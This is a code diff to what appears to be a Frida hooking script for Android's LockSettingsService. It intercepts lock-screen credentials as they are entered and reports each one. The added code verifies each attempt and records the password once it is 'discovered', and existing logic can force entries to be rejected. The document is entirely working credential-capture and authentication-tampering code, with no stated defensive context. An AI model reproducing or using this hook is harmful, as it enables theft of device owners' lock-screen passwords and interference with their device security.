@@ -3,6 +3,7 @@ import Java from "frida-java-bridge";
 let config;
 
 const WRONG_PASSWORD = [0];
+const RESPONSE_OK = 0;
 
 const LOCK_SETTINGS_SERVICE_CLASS_NAME =
   "com.android.server.locksettings.LockSettingsService";
@@ -125,6 +126,20 @@ const installHook = () => {
     ) {
       const input = bytesToString(credential.mCredential.value);
       send(`Password entered: ${input}`);
+
+      if (!config.password) {
+        const verifyCredentialResponse = this.doVerifyCredential(
+          credential,
+          config.user ?? userId,
+          progressCallback,
+          flags,
+        );
+        if (verifyCredentialResponse.mResponseCode.value === RESPONSE_OK) {
+          send(`Discovered password: ${input}`);
+          config.password = input;
+        }
+        return verifyCredentialResponse;
+      }
 
       if (isRejected(input) || !isAccepted(input))
         credential.mCredential.value = WRONG_PASSWORD;
